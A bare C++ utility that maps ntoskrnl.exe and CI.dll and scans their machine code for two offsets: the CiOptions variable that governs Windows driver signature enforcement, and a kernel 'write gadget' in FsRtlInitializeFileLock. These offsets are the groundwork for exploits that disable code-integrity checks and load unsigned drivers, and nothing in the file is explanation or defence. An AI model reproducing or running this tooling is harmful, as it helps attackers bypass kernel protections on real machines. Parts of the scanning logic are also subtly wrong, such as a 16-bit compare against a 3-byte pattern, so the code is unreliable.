#include "global.h"

void FindWriteGadget(_In_ PVOID MappedBase)
{
	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));

	if (FsRtlInitializeFileLock == nullptr)
		return;

	// Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);

	LONG Rel = 0;
	ULONG c = 0;
	ULONG j = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(FsRtlInitializeFileLock + c) == 0x118948) // MOV qword ptr [RCX],RDX - 48 89 11
		{
			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;

	// Printf(L"ntBase:                  %p\n", MappedBase);
	Printf(L"> Offset asm mov:   %p\n", (mov - MappedBase));
}

void QueryCiOptions(_In_ PVOID MappedBase)
{
	ULONG c;
	LONG Rel = 0;

	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	// Printf(L"CiInitialize:    %p\n", CiInitialize);

	if (CiInitialize == nullptr)
		return;

	c = 0;
	ULONG j = 0;
	do
	{
		// call CipInitialize
		if (CiInitialize[c] == 0xE8)
			j++;

		if (j > 2)
		{
			Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;

	// Printf(L"CipInitialize:   %p\n", CipInitialize);
	c = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(CipInitialize + c) == 0x0d89)
		{
			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;

	// Printf(L"CiBase:          %p\n", MappedBase);
	// Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
	Printf(L"> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
}

void GetWriteGadgetOffset()
{
	WCHAR Path[MAX_PATH];
	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return;
	}
	FindWriteGadget(MappedBase);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return;
}

void GetCiOptionsOffset()
{
	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	const CHAR CiDll[] = "CI.dll";

	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, CiDll);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return;
	}

	QueryCiOptions(MappedBase);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return;
}

void CIInfo() {
	Printf(L"\n");
	GetCiOptionsOffset();
	Printf(L"\n");
	GetWriteGadgetOffset();
}


void wmain()
{
	CIInfo();
}
